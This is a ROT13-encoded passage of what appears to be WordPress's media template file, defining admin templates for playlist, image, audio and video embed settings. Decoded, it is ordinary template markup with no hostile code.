	</fpevcg>

	<?cuc // Grzcyngr sbe gur Cynlyvfgf frggvatf, hfrq sbe rknzcyr va gur fvqrone. ?>
	<fpevcg glcr=\"grkg/ugzy\" vq=\"gzcy-cynlyvfg-frggvatf\">
		<u2><?cuc _r( 'Cynlyvfg Frggvatf' ); ?></u2>

		<# ine rzcglZbqry = _.vfRzcgl( qngn.zbqry ),
			vfIvqrb = 'ivqrb' === qngn.pbagebyyre.trg('yvoenel').cebcf.trg('glcr'); #>

		<fcna pynff=\"frggvat\">
			<vachg glcr=\"purpxobk\" vq=\"cynlyvfg-frggvatf-fubj-yvfg\" qngn-frggvat=\"genpxyvfg\" <# vs ( rzcglZbqry ) { #>
				purpxrq=\"purpxrq\"
			<# } #> />
			<ynory sbe=\"cynlyvfg-frggvatf-fubj-yvfg\" pynff=\"purpxobk-ynory-vayvar\">
				<# vs ( vfIvqrb ) { #>
				<?cuc _r( 'Fubj Ivqrb Yvfg' ); ?>
				<# } ryfr { #>
				<?cuc _r( 'Fubj Genpxyvfg' ); ?>
				<# } #>
			</ynory>
		</fcna>

		<# vs ( ! vfIvqrb ) { #>
		<fcna pynff=\"frggvat\">
			<vachg glcr=\"purpxobk\" vq=\"cynlyvfg-frggvatf-fubj-negvfg\" qngn-frggvat=\"negvfgf\" <# vs ( rzcglZbqry ) { #>
				purpxrq=\"purpxrq\"
			<# } #> />
			<ynory sbe=\"cynlyvfg-frggvatf-fubj-negvfg\" pynff=\"purpxobk-ynory-vayvar\">
				<?cuc _r( 'Fubj Negvfg Anzr va Genpxyvfg' ); ?>
			</ynory>
		</fcna>
		<# } #>

		<fcna pynff=\"frggvat\">
			<vachg glcr=\"purpxobk\" vq=\"cynlyvfg-frggvatf-fubj-vzntrf\" qngn-frggvat=\"vzntrf\" <# vs ( rzcglZbqry ) { #>
				purpxrq=\"purpxrq\"
			<# } #> />
			<ynory sbe=\"cynlyvfg-frggvatf-fubj-vzntrf\" pynff=\"purpxobk-ynory-vayvar\">
				<?cuc _r( 'Fubj Vzntrf' ); ?>
			</ynory>
		</fcna>
	</fpevcg>

	<?cuc // Grzcyngr sbe gur \"Vafreg sebz HEY\" ynlbhg. ?>
	<fpevcg glcr=\"grkg/ugzy\" vq=\"gzcy-rzorq-yvax-frggvatf\">
		<fcna pynff=\"frggvat yvax-grkg\">
			<ynory sbe=\"rzorq-yvax-frggvatf-yvax-grkg\" pynff=\"anzr\"><?cuc _r( 'Yvax Grkg' ); ?></ynory>
			<vachg glcr=\"grkg\" vq=\"rzorq-yvax-frggvatf-yvax-grkg\" pynff=\"nyvtazrag\" qngn-frggvat=\"yvaxGrkg\" />
		</fcna>
		<qvi pynff=\"rzorq-pbagnvare\" fglyr=\"qvfcynl: abar;\">
			<qvi pynff=\"rzorq-cerivrj\"></qvi>
		</qvi>
	</fpevcg>

	<?cuc // Grzcyngr sbe gur \"Vafreg sebz HEY\" vzntr cerivrj naq qrgnvyf. ?>
	<fpevcg glcr=\"grkg/ugzy\" vq=\"gzcy-rzorq-vzntr-frggvatf\">
		<qvi pynff=\"jc-pyrnesvk\">
			<qvi pynff=\"guhzoanvy\">
				<vzt fep=\"{{ qngn.zbqry.hey }}\" qenttnoyr=\"snyfr\" nyg=\"\" />
			</qvi>
		</qvi>

		<fcna pynff=\"frggvat nyg-grkg unf-qrfpevcgvba\">
			<ynory sbe=\"rzorq-vzntr-frggvatf-nyg-grkg\" pynff=\"anzr\"><?cuc _r( 'Nygreangvir Grkg' ); ?></ynory>
			<grkgnern vq=\"rzorq-vzntr-frggvatf-nyg-grkg\" qngn-frggvat=\"nyg\" nevn-qrfpevorqol=\"nyg-grkg-qrfpevcgvba\"></grkgnern>
		</fcna>
		<c pynff=\"qrfpevcgvba\" vq=\"nyg-grkg-qrfpevcgvba\"><?cuc rpub $nyg_grkg_qrfpevcgvba; ?></c>

		<?cuc
		/** Guvf svygre vf qbphzragrq va jc-nqzva/vapyhqrf/zrqvn.cuc */
		vs ( ! nccyl_svygref( 'qvfnoyr_pncgvbaf', '' ) ) :
			?>
			<fcna pynff=\"frggvat pncgvba\">
				<ynory sbe=\"rzorq-vzntr-frggvatf-pncgvba\" pynff=\"anzr\"><?cuc _r( 'Pncgvba' ); ?></ynory>
				<grkgnern vq=\"rzorq-vzntr-frggvatf-pncgvba\" qngn-frggvat=\"pncgvba\"></grkgnern>
			</fcna>
		<?cuc raqvs; ?>

		<svryqfrg pynff=\"frggvat-tebhc\">
			<yrtraq pynff=\"anzr\"><?cuc _r( 'Nyvta' ); ?></yrtraq>
			<fcna pynff=\"frggvat nyvta\">
				<fcna pynff=\"ohggba-tebhc ohggba-ynetr\" qngn-frggvat=\"nyvta\">
					<ohggba pynff=\"ohggba\" inyhr=\"yrsg\">
						<?cuc rfp_ugzy_r( 'Yrsg' ); ?>
					</ohggba>
					<ohggba pynff=\"ohggba\" inyhr=\"pragre\">
						<?cuc rfp_ugzy_r( 'Pragre' ); ?>
					</ohggba>
					<ohggba pynff=\"ohggba\" inyhr=\"evtug\">
						<?cuc rfp_ugzy_r( 'Evtug' ); ?>
					</ohggba>
					<ohggba pynff=\"ohggba npgvir\" inyhr=\"abar\">
						<?cuc rpub rfp_ugzy_k( 'Abar', 'Nyvtazrag bcgvba' ); ?>
					</ohggba>
				</fcna>
			</fcna>
		</svryqfrg>

		<svryqfrg pynff=\"frggvat-tebhc\">
			<yrtraq pynff=\"anzr\"><?cuc _r( 'Yvax Gb' ); ?></yrtraq>
			<fcna pynff=\"frggvat yvax-gb\">
				<fcna pynff=\"ohggba-tebhc ohggba-ynetr\" qngn-frggvat=\"yvax\">
					<ohggba pynff=\"ohggba\" inyhr=\"svyr\">
						<?cuc rfp_ugzy_r( 'Vzntr HEY' ); ?>
					</ohggba>
					<ohggba pynff=\"ohggba\" inyhr=\"phfgbz\">
						<?cuc rfp_ugzy_r( 'Phfgbz HEY' ); ?>
					</ohggba>
					<ohggba pynff=\"ohggba npgvir\" inyhr=\"abar\">
						<?cuc rpub rfp_ugzy_k( 'Abar', 'Zrqvn vgrz yvax bcgvba' ); ?>
					</ohggba>
				</fcna>
			</fcna>
			<fcna pynff=\"frggvat\">
				<ynory sbe=\"rzorq-vzntr-frggvatf-yvax-gb-phfgbz\" pynff=\"anzr\"><?cuc _r( 'HEY' ); ?></ynory>
				<vachg glcr=\"grkg\" vq=\"rzorq-vzntr-frggvatf-yvax-gb-phfgbz\" pynff=\"yvax-gb-phfgbz\" qngn-frggvat=\"yvaxHey\" />
			</fcna>
		</svryqfrg>
	</fpevcg>

	<?cuc // Grzcyngr sbe gur Vzntr qrgnvyf, hfrq sbe rknzcyr va gur rqvgbe. ?>
	<fpevcg glcr=\"grkg/ugzy\" vq=\"gzcy-vzntr-qrgnvyf\">
		<qvi pynff=\"zrqvn-rzorq\">
			<qvi pynff=\"rzorq-zrqvn-frggvatf\">
				<qvi pynff=\"pbyhza-frggvatf\">
					<fcna pynff=\"frggvat nyg-grkg unf-qrfpevcgvba\">
						<ynory sbe=\"vzntr-qrgnvyf-nyg-grkg\" pynff=\"anzr\"><?cuc _r( 'Nygreangvir Grkg' ); ?></ynory>
						<grkgnern vq=\"vzntr-qrgnvyf-nyg-grkg\" qngn-frggvat=\"nyg\" nevn-qrfpevorqol=\"nyg-grkg-qrfpevcgvba\">{{ qngn.zbqry.nyg }}</grkgnern>
					</fcna>
					<c pynff=\"qrfpevcgvba\" vq=\"nyg-grkg-qrfpevcgvba\"><?cuc rpub $nyg_grkg_qrfpevcgvba; ?></c>

					<?cuc
					/** Guvf svygre vf qbphzragrq va jc-nqzva/vapyhqrf/zrqvn.cuc */
					vs ( ! nccyl_svygref( 'qvfnoyr_pncgvbaf', '' ) ) :
						?>
						<fcna pynff=\"frggvat pncgvba\">
							<ynory sbe=\"vzntr-qrgnvyf-pncgvba\" pynff=\"anzr\"><?cuc _r( 'Pncgvba' ); ?></ynory>
							<grkgnern vq=\"vzntr-qrgnvyf-pncgvba\" qngn-frggvat=\"pncgvba\">{{ qngn.zbqry.pncgvba }}</grkgnern>
						</fcna>
					<?cuc raqvs; ?>

					<u2><?cuc _r( 'Qvfcynl Frggvatf' ); ?></u2>
					<svryqfrg pynff=\"frggvat-tebhc\">
						<yrtraq pynff=\"yrtraq-vayvar\"><?cuc _r( 'Nyvta' ); ?></yrtraq>
						<fcna pynff=\"frggvat nyvta\">
							<fcna pynff=\"ohggba-tebhc ohggba-ynetr\" qngn-frggvat=\"nyvta\">
								<ohggba pynff=\"ohggba\" inyhr=\"yrsg\">
									<?cuc rfp_ugzy_r( 'Yrsg' ); ?>
								</ohggba>
								<ohggba pynff=\"ohggba\" inyhr=\"pragre\">
									<?cuc rfp_ugzy_r( 'Pragre' ); ?>
								</ohggba>
								<ohggba pynff=\"ohggba\" inyhr=\"evtug\">
									<?cuc rfp_ugzy_r( 'Evtug' ); ?>
								</ohggba>
								<ohggba pynff=\"ohggba npgvir\" inyhr=\"abar\">
									<?cuc rpub rfp_ugzy_k( 'Abar', 'Nyvtazrag bcgvba' ); ?>
								</ohggba>
							</fcna>
						</fcna>
					</svryqfrg>

					<# vs ( qngn.nggnpuzrag ) { #>
						<# vs ( 'haqrsvarq' !== glcrbs qngn.nggnpuzrag.fvmrf ) { #>
							<fcna pynff=\"frggvat fvmr\">
								<ynory sbe=\"vzntr-qrgnvyf-fvmr\" pynff=\"anzr\"><?cuc _r( 'Fvmr' ); ?></ynory>
								<fryrpg vq=\"vzntr-qrgnvyf-fvmr\" pynff=\"fvmr\" anzr=\"fvmr\"
									qngn-frggvat=\"fvmr\"
									<# vs ( qngn.hfreFrggvatf ) { #>
										qngn-hfre-frggvat=\"vztfvmr\"
									<# } #>>
									<?cuc
									/** Guvf svygre vf qbphzragrq va jc-nqzva/vapyhqrf/zrqvn.cuc */
									$fvmrf = nccyl_svygref(
										'vzntr_fvmr_anzrf_pubbfr',
										neenl(
											'guhzoanvy' => __( 'Guhzoanvy' ),
											'zrqvhz'    => __( 'Zrqvhz' ),
											'ynetr'     => __( 'Ynetr' ),
											'shyy'      => __( 'Shyy Fvmr' ),
										)
									);

									sbernpu ( $fvmrf nf $inyhr => $anzr ) :
										?>
										<#
										ine fvmr = qngn.fvmrf['<?cuc rpub rfp_wf( $inyhr ); ?>'];
										vs ( fvmr ) { #>
											<bcgvba inyhr=\"<?cuc rpub rfp_ngge( $inyhr ); ?>\">
												<?cuc rpub rfp_ugzy( $anzr ); ?> &aqnfu; {{ fvmr.jvqgu }} &gvzrf; {{ fvmr.urvtug }}
											</bcgvba>
										<# } #>
									<?cuc raqsbernpu; ?>
									<bcgvba inyhr=\"<?cuc rpub rfp_ngge( 'phfgbz' ); ?>\">
										<?cuc _r( 'Phfgbz Fvmr' ); ?>
									</bcgvba>
								</fryrpg>
							</fcna>
						<# } #>
							<qvi pynff=\"phfgbz-fvmr jc-pyrnesvk<# vs ( qngn.zbqry.fvmr !== 'phfgbz' ) { #> uvqqra<# } #>\">
								<fcna pynff=\"phfgbz-fvmr-frggvat\">
									<ynory sbe=\"vzntr-qrgnvyf-fvmr-jvqgu\"><?cuc _r( 'Jvqgu' ); ?></ynory>
									<vachg glcr=\"ahzore\" vq=\"vzntr-qrgnvyf-fvmr-jvqgu\" nevn-qrfpevorqol=\"vzntr-fvmr-qrfp\" qngn-frggvat=\"phfgbzJvqgu\" fgrc=\"1\" inyhr=\"{{ qngn.zbqry.phfgbzJvqgu }}\" />
								</fcna>
								<fcna pynff=\"frc\" nevn-uvqqra=\"gehr\">&gvzrf;</fcna>
								<fcna pynff=\"phfgbz-fvmr-frggvat\">
									<ynory sbe=\"vzntr-qrgnvyf-fvmr-urvtug\"><?cuc _r( 'Urvtug' ); ?></ynory>
									<vachg glcr=\"ahzore\" vq=\"vzntr-qrgnvyf-fvmr-urvtug\" nevn-qrfpevorqol=\"vzntr-fvmr-qrfp\" qngn-frggvat=\"phfgbzUrvtug\" fgrc=\"1\" inyhr=\"{{ qngn.zbqry.phfgbzUrvtug }}\" />
								</fcna>
								<c vq=\"vzntr-fvmr-qrfp\" pynff=\"qrfpevcgvba\"><?cuc _r( 'Vzntr fvmr va cvkryf' ); ?></c>
							</qvi>
					<# } #>

					<fcna pynff=\"frggvat yvax-gb\">
						<ynory sbe=\"vzntr-qrgnvyf-yvax-gb\" pynff=\"anzr\"><?cuc _r( 'Yvax Gb' ); ?></ynory>
						<fryrpg vq=\"vzntr-qrgnvyf-yvax-gb\" qngn-frggvat=\"yvax\">
						<# vs ( qngn.nggnpuzrag ) { #>
							<bcgvba inyhr=\"svyr\">
								<?cuc rfp_ugzy_r( 'Zrqvn Svyr' ); ?>
							</bcgvba>
							<bcgvba inyhr=\"cbfg\">
								<?cuc rfp_ugzy_r( 'Nggnpuzrag Cntr' ); ?>
							</bcgvba>
						<# } ryfr { #>
							<bcgvba inyhr=\"svyr\">
								<?cuc rfp_ugzy_r( 'Vzntr HEY' ); ?>
							</bcgvba>
						<# } #>
							<bcgvba inyhr=\"phfgbz\">
								<?cuc rfp_ugzy_r( 'Phfgbz HEY' ); ?>
							</bcgvba>
							<bcgvba inyhr=\"abar\">
								<?cuc rpub rfp_ugzy_k( 'Abar', 'Zrqvn vgrz yvax bcgvba' ); ?>
							</bcgvba>
						</fryrpg>
					</fcna>
					<fcna pynff=\"frggvat\">
						<ynory sbe=\"vzntr-qrgnvyf-yvax-gb-phfgbz\" pynff=\"anzr\"><?cuc _r( 'HEY' ); ?></ynory>
						<vachg glcr=\"grkg\" vq=\"vzntr-qrgnvyf-yvax-gb-phfgbz\" pynff=\"yvax-gb-phfgbz\" qngn-frggvat=\"yvaxHey\" />
					</fcna>

					<qvi pynff=\"nqinaprq-frpgvba\">
						<u2><ohggba glcr=\"ohggba\" pynff=\"ohggba-yvax nqinaprq-gbttyr\"><?cuc _r( 'Nqinaprq Bcgvbaf' ); ?></ohggba></u2>
						<qvi pynff=\"nqinaprq-frggvatf uvqqra\">
							<qvi pynff=\"nqinaprq-vzntr\">
								<fcna pynff=\"frggvat gvgyr-grkg\">
									<ynory sbe=\"vzntr-qrgnvyf-gvgyr-nggevohgr\" pynff=\"anzr\"><?cuc _r( 'Vzntr Gvgyr Nggevohgr' ); ?></ynory>
									<vachg glcr=\"grkg\" vq=\"vzntr-qrgnvyf-gvgyr-nggevohgr\" qngn-frggvat=\"gvgyr\" inyhr=\"{{ qngn.zbqry.gvgyr }}\" />
								</fcna>
								<fcna pynff=\"frggvat rkgen-pynffrf\">
									<ynory sbe=\"vzntr-qrgnvyf-pff-pynff\" pynff=\"anzr\"><?cuc _r( 'Vzntr PFF Pynff' ); ?></ynory>
									<vachg glcr=\"grkg\" vq=\"vzntr-qrgnvyf-pff-pynff\" qngn-frggvat=\"rkgenPynffrf\" inyhr=\"{{ qngn.zbqry.rkgenPynffrf }}\" />
								</fcna>
							</qvi>
							<qvi pynff=\"nqinaprq-yvax\">
								<fcna pynff=\"frggvat yvax-gnetrg\">
									<vachg glcr=\"purpxobk\" vq=\"vzntr-qrgnvyf-yvax-gnetrg\" qngn-frggvat=\"yvaxGnetrgOynax\" inyhr=\"_oynax\" <# vs ( qngn.zbqry.yvaxGnetrgOynax ) { #>purpxrq=\"purpxrq\"<# } #>>
									<ynory sbe=\"vzntr-qrgnvyf-yvax-gnetrg\" pynff=\"purpxobk-ynory\"><?cuc _r( 'Bcra yvax va n arj gno' ); ?></ynory>
								</fcna>
								<fcna pynff=\"frggvat yvax-ery\">
									<ynory sbe=\"vzntr-qrgnvyf-yvax-ery\" pynff=\"anzr\"><?cuc _r( 'Yvax Ery' ); ?></ynory>
									<vachg glcr=\"grkg\" vq=\"vzntr-qrgnvyf-yvax-ery\" qngn-frggvat=\"yvaxEry\" inyhr=\"{{ qngn.zbqry.yvaxEry }}\" />
								</fcna>
								<fcna pynff=\"frggvat yvax-pynff-anzr\">
									<ynory sbe=\"vzntr-qrgnvyf-yvax-pff-pynff\" pynff=\"anzr\"><?cuc _r( 'Yvax PFF Pynff' ); ?></ynory>
									<vachg glcr=\"grkg\" vq=\"vzntr-qrgnvyf-yvax-pff-pynff\" qngn-frggvat=\"yvaxPynffAnzr\" inyhr=\"{{ qngn.zbqry.yvaxPynffAnzr }}\" />
								</fcna>
							</qvi>
						</qvi>
					</qvi>
				</qvi>
				<qvi pynff=\"pbyhza-vzntr\">
					<qvi pynff=\"vzntr\">
						<vzt fep=\"{{ qngn.zbqry.hey }}\" qenttnoyr=\"snyfr\" nyg=\"\" />
						<# vs ( qngn.nggnpuzrag && jvaqbj.vzntrRqvg ) { #>
							<qvi pynff=\"npgvbaf\">
								<vachg glcr=\"ohggba\" pynff=\"rqvg-nggnpuzrag ohggba\" inyhr=\"<?cuc rfp_ngge_r( 'Rqvg Bevtvany' ); ?>\" />
								<vachg glcr=\"ohggba\" pynff=\"ercynpr-nggnpuzrag ohggba\" inyhr=\"<?cuc rfp_ngge_r( 'Ercynpr' ); ?>\" />
							</qvi>
						<# } #>
					</qvi>
				</qvi>
			</qvi>
		</qvi>
	</fpevcg>

	<?cuc // Grzcyngr sbe gur Vzntr Rqvgbe ynlbhg. ?>
	<fpevcg glcr=\"grkg/ugzy\" vq=\"gzcy-vzntr-rqvgbe\">
		<qvi vq=\"zrqvn-urnq-{{ qngn.vq }}\"></qvi>
		<qvi vq=\"vzntr-rqvgbe-{{ qngn.vq }}\"></qvi>
	</fpevcg>

	<?cuc // Grzcyngr sbe na rzorqqrq Nhqvb qrgnvyf. ?>
	<fpevcg glcr=\"grkg/ugzy\" vq=\"gzcy-nhqvb-qrgnvyf\">
		<# ine rkg, ugzy5glcrf = {
			zc3: jc.zrqvn.ivrj.frggvatf.rzorqZvzrf.zc3,
			btt: jc.zrqvn.ivrj.frggvatf.rzorqZvzrf.btt
		}; #>

		<?cuc $nhqvb_glcrf = jc_trg_nhqvb_rkgrafvbaf(); ?>
		<qvi pynff=\"zrqvn-rzorq zrqvn-rzorq-qrgnvyf\">
			<qvi pynff=\"rzorq-zrqvn-frggvatf rzorq-nhqvb-frggvatf\">
				<?cuc jc_haqrefpber_nhqvb_grzcyngr(); ?>

				<# vs ( ! _.vfRzcgl( qngn.zbqry.fep ) ) {
					rkg = qngn.zbqry.fep.fcyvg('.').cbc();
					vs ( ugzy5glcrf[ rkg ] ) {
						qryrgr ugzy5glcrf[ rkg ];
					}
				#>
				<fcna pynff=\"frggvat\">
					<ynory sbe=\"nhqvb-qrgnvyf-fbhepr\" pynff=\"anzr\"><?cuc _r( 'HEY' ); ?></ynory>
					<vachg glcr=\"grkg\" vq=\"nhqvb-qrgnvyf-fbhepr\" ernqbayl qngn-frggvat=\"fep\" inyhr=\"{{ qngn.zbqry.fep }}\" />
					<ohggba glcr=\"ohggba\" pynff=\"ohggba-yvax erzbir-frggvat\"><?cuc _r( 'Erzbir nhqvb fbhepr' ); ?></ohggba>
				</fcna>
				<# } #>
				<?cuc

				sbernpu ( $nhqvb_glcrf nf $glcr ) :
					?>
				<# vs ( ! _.vfRzcgl( qngn.zbqry.<?cuc rpub $glcr; ?> ) ) {
					vs ( ! _.vfHaqrsvarq( ugzy5glcrf.<?cuc rpub $glcr; ?> ) ) {
						qryrgr ugzy5glcrf.<?cuc rpub $glcr; ?>;
					}
				#>
				<fcna pynff=\"frggvat\">
					<ynory sbe=\"nhqvb-qrgnvyf-<?cuc rpub $glcr . '-fbhepr'; ?>\" pynff=\"anzr\"><?cuc rpub fgegbhccre( $glcr ); ?></ynory>
					<vachg glcr=\"grkg\" vq=\"nhqvb-qrgnvyf-<?cuc rpub $glcr . '-fbhepr'; ?>\" ernqbayl qngn-frggvat=\"<?cuc rpub $glcr; ?>\" inyhr=\"{{ qngn.zbqry.<?cuc rpub $glcr; ?> }}\" />
					<ohggba glcr=\"ohggba\" pynff=\"ohggba-yvax erzbir-frggvat\"><?cuc _r( 'Erzbir nhqvb fbhepr' ); ?></ohggba>
				</fcna>
				<# } #>
				<?cuc raqsbernpu; ?>

				<# vs ( ! _.vfRzcgl( ugzy5glcrf ) ) { #>
				<svryqfrg pynff=\"frggvat-tebhc\">
					<yrtraq pynff=\"anzr\"><?cuc _r( 'Nqq nygreangr fbheprf sbe znkvzhz UGZY5 cynlonpx' ); ?></yrtraq>
					<fcna pynff=\"frggvat\">
						<fcna pynff=\"ohggba-ynetr\">
						<# _.rnpu( ugzy5glcrf, shapgvba (zvzr, glcr) { #>
							<ohggba pynff=\"ohggba nqq-zrqvn-fbhepr\" qngn-zvzr=\"{{ zvzr }}\">{{ glcr }}</ohggba>
						<# } ) #>
						</fcna>
					</fcna>
				</svryqfrg>
				<# } #>

				<svryqfrg pynff=\"frggvat-tebhc\">
					<yrtraq pynff=\"anzr\"><?cuc _r( 'Cerybnq' ); ?></yrtraq>
					<fcna pynff=\"frggvat cerybnq\">
						<fcna pynff=\"ohggba-tebhc ohggba-ynetr\" qngn-frggvat=\"cerybnq\">
							<ohggba pynff=\"ohggba\" inyhr=\"nhgb\"><?cuc _rk( 'Nhgb', 'nhgb cerybnq' ); ?></ohggba>
							<ohggba pynff=\"ohggba\" inyhr=\"zrgnqngn\"><?cuc _r( 'Zrgnqngn' ); ?></ohggba>
							<ohggba pynff=\"ohggba npgvir\" inyhr=\"abar\"><?cuc _rk( 'Abar', 'Cerybnq inyhr' ); ?></ohggba>
						</fcna>
					</fcna>
				</svryqfrg>

				<fcna pynff=\"frggvat-tebhc\">
					<fcna pynff=\"frggvat purpxobk-frggvat nhgbcynl\">
						<vachg glcr=\"purpxobk\" vq=\"nhqvb-qrgnvyf-nhgbcynl\" qngn-frggvat=\"nhgbcynl\" />
						<ynory sbe=\"nhqvb-qrgnvyf-nhgbcynl\" pynff=\"purpxobk-ynory\"><?cuc _r( 'Nhgbcynl' ); ?></ynory>
					</fcna>

					<fcna pynff=\"frggvat purpxobk-frggvat\">
						<vachg glcr=\"purpxobk\" vq=\"nhqvb-qrgnvyf-ybbc\" qngn-frggvat=\"ybbc\" />
						<ynory sbe=\"nhqvb-qrgnvyf-ybbc\" pynff=\"purpxobk-ynory\"><?cuc _r( 'Ybbc' ); ?></ynory>
					</fcna>
				</fcna>
			</qvi>
		</qvi>
	</fpevcg>

	<?cuc // Grzcyngr sbe na rzorqqrq Ivqrb qrgnvyf. ?>
	<fpevcg glcr=\"grkg/ugzy\" vq=\"gzcy-ivqrb-qrgnvyf\">
		<# ine rkg, ugzy5glcrf = {
			zc4: jc.zrqvn.ivrj.frggvatf.rzorqZvzrf.zc4,
			bti: jc.zrqvn.ivrj.frggvatf.rzorqZvzrf.bti,
			jroz: jc.zrqvn.ivrj.frggvatf.rzorqZvzrf.jroz
		}; #>

		<?cuc $ivqrb_glcrf = jc_trg_ivqrb_rkgrafvbaf(); ?>
		<qvi pynff=\"zrqvn-rzorq zrqvn-rzorq-qrgnvyf\">
			<qvi pynff=\"rzorq-zrqvn-frggvatf rzorq-ivqrb-frggvatf\">
				<qvi pynff=\"jc-ivqrb-ubyqre\">
				<#
				ine j = ! qngn.zbqry.jvqgu || qngn.zbqry.jvqgu > 640 ? 640 : qngn.zbqry.jvqgu,
					u = ! qngn.zbqry.urvtug ? 360 : qngn.zbqry.urvtug;

				vs ( qngn.zbqry.jvqgu && j !== qngn.zbqry.jvqgu ) {
					u = Zngu.prvy( ( u * j ) / qngn.zbqry.jvqgu );
				}
				#>

				<?cuc jc_haqrefpber_ivqrb_grzcyngr(); ?>

				<# vs ( ! _.vfRzcgl( qngn.zbqry.fep ) ) {
					rkg = qngn.zbqry.fep.fcyvg('.').cbc();
					vs ( ugzy5glcrf[ rkg ] ) {
						qryrgr ugzy5glcrf[ rkg ];
					}
				#>
				<fcna pynff=\"frggvat\">
					<ynory sbe=\"ivqrb-qrgnvyf-fbhepr\" pynff=\"anzr\"><?cuc _r( 'HEY' ); ?></ynory>
					<vachg glcr=\"grkg\" vq=\"ivqrb-qrgnvyf-fbhepr\" ernqbayl qngn-frggvat=\"fep\" inyhr=\"{{ qngn.zbqry.fep }}\" />
					<ohggba glcr=\"ohggba\" pynff=\"ohggba-yvax erzbir-frggvat\"><?cuc _r( 'Erzbir ivqrb fbhepr' ); ?></ohggba>
				</fcna>
				<# } #>
				<?cuc
				sbernpu ( $ivqrb_glcrf nf $glcr ) :
					?>
				<# vs ( ! _.vfRzcgl( qngn.zbqry.<?cuc rpub $glcr; ?> ) ) {
					vs ( ! _.vfHaqrsvarq( ugzy5glcrf.<?cuc rpub $glcr; ?> ) ) {
						qryrgr ugzy5glcrf.<?cuc rpub $glcr; ?>;
					}
				#>
				<fcna pynff=\"frggvat\">
					<ynory sbe=\"ivqrb-qrgnvyf-<?cuc rpub $glcr . '-fbhepr'; ?>\" pynff=\"anzr\"><?cuc rpub fgegbhccre( $glcr ); ?></ynory>
					<vachg glcr=\"grkg\" vq=\"ivqrb-qrgnvyf-<?cuc rpub $glcr . '-fbhepr'; ?>\" ernqbayl qngn-frggvat=\"<?cuc rpub $glcr; ?>\" inyhr=\"{{ qngn.zbqry.<?cuc rpub $glcr; ?> }}\" />
					<ohggba glcr=\"ohggba\" pynff=\"ohggba-yvax erzbir-frggvat\"><?cuc _r( 'Erzbir ivqrb fbhepr' ); ?></ohggba>
				</fcna>
				<# } #>
				<?cuc raqsbernpu; ?>
				</qvi>

				<# vs ( ! _.vfRzcgl( ugzy5glcrf ) ) { #>
				<svryqfrg pynff=\"frggvat-tebhc\">
					<yrtraq pynff=\"anzr\"><?cuc _r( 'Nqq nygreangr fbheprf sbe znkvzhz UGZY5 cynlonpx' ); ?></yrtraq>
					<fcna pynff=\"frggvat\">
						<fcna pynff=\"ohggba-ynetr\">
						<# _.rnpu( ugzy5glcrf, shapgvba (zvzr, glcr) { #>
							<ohggba pynff=\"ohggba nqq-zrqvn-fbhepr\" qngn-zvzr=\"{{ zvzr }}\">{{ glcr }}</ohggba>
						<# } ) #>
						</fcna>
					</fcna>
				</svryqfrg>
				<# } #>

				<# vs ( ! _.vfRzcgl( qngn.zbqry.cbfgre ) ) { #>
				<fcna pynff=\"frggvat\">
					<ynory sbe=\"ivqrb-qrgnvyf-cbfgre-vzntr\" pynff=\"anzr\"><?cuc _r( 'Cbfgre Vzntr' ); ?></ynory>
					<vachg glcr=\"grkg\" vq=\"ivqrb-qrgnvyf-cbfgre-vzntr\" ernqbayl qngn-frggvat=\"cbfgre\" inyhr=\"{{ qngn.zbqry.cbfgre }}\" />
					<ohggba glcr=\"ohggba\" pynff=\"ohggba-yvax erzbir-frggvat\"><?cuc _r( 'Erzbir cbfgre vzntr' ); ?></ohggba>
				</fcna>
				<# } #>

				<svryqfrg pynff=\"frggvat-tebhc\">
					<yrtraq pynff=\"anzr\"><?cuc _r( 'Cerybnq' ); ?></yrtraq>
					<fcna pynff=\"frggvat cerybnq\">
						<fcna pynff=\"ohggba-tebhc ohggba-ynetr\" qngn-frggvat=\"cerybnq\">
							<ohggba pynff=\"ohggba\" inyhr=\"nhgb\"><?cuc _rk( 'Nhgb', 'nhgb cerybnq' ); ?></ohggba>
							<ohggba pynff=\"ohggba\" inyhr=\"zrgnqngn\"><?cuc _r( 'Zrgnqngn' ); ?></ohggba>
							<ohggba pynff=\"ohggba npgvir\" inyhr=\"abar\"><?cuc _rk( 'Abar', 'Cerybnq inyhr' ); ?></ohggba>
						</fcna>
					</fcna>
				</svryqfrg>

				<fcna pynff=\"frggvat-tebhc\">
					<fcna pynff=\"frggvat purpxobk-frggvat nhgbcynl\">
						<vachg glcr=\"purpxobk\" vq=\"ivqrb-qrgnvyf-nhgbcynl\" qngn-frggvat=\"nhgbcynl\" />
						<ynory sbe=\"ivqrb-qrgnvyf-nhgbcynl\" pynff=\"purpxobk-ynory\"><?cuc _r( 'Nhgbcynl' ); ?></ynory>
					</fcna>

					<fcna pynff=\"frggvat purpxobk-frggvat\">
						<vachg glcr=\"purpxobk\" vq=\"ivqrb-qrgnvyf-ybbc\" qngn-frggvat=\"ybbc\" />
						<ynory sbe=\"ivqrb-qrgnvyf-ybbc\" pynff=\"purpxobk-ynory\"><?cuc _r( 'Ybbc' ); ?></ynory>
					</fcna>
				</fcna>

				<fcna pynff=\"frggvat\" qngn-frggvat=\"pbagrag\">
					<#
					ine pbagrag = '';
					vs ( ! _.vfRzcgl( qngn.zbqry.pbagrag ) ) {
						ine genpxf = wDhrel( qngn.zbqry.pbagrag ).svygre( 'genpx' );
						_.rnpu( genpxf.gbNeenl(), shapgvba( genpx, vaqrk ) {
							pbagrag += genpx.bhgreUGZY; #>
						<ynory sbe=\"ivqrb-qrgnvyf-genpx-{{ vaqrk }}\" pynff=\"anzr\"><?cuc _r( 'Genpxf (fhogvgyrf, pncgvbaf, qrfpevcgvbaf, puncgref, be zrgnqngn)' ); ?></ynory>
						<vachg pynff=\"pbagrag-genpx\" glcr=\"grkg\" vq=\"ivqrb-qrgnvyf-genpx-{{ vaqrk }}\" nevn-qrfpevorqol=\"ivqrb-qrgnvyf-genpx-qrfp-{{ vaqrk }}\" inyhr=\"{{ genpx.bhgreUGZY }}\" />
						<fcna pynff=\"qrfpevcgvba\" vq=\"ivqrb-qrgnvyf-genpx-qrfp-{{ vaqrk }}\">
						<?cuc
							cevags(
								/* genafyngbef: 1: \"fepynat\" UGZY nggevohgr, 2: \"ynory\" UGZY nggevohgr, 3: \"xvaq\" UGZY nggevohgr. */
								__( 'Gur %1$f, %2$f, naq %3$f inyhrf pna or rqvgrq gb frg gur ivqrb genpx ynathntr naq xvaq.' ),
								'fepynat',
								'ynory',
								'xvaq'
							);
						?>
						</fcna>
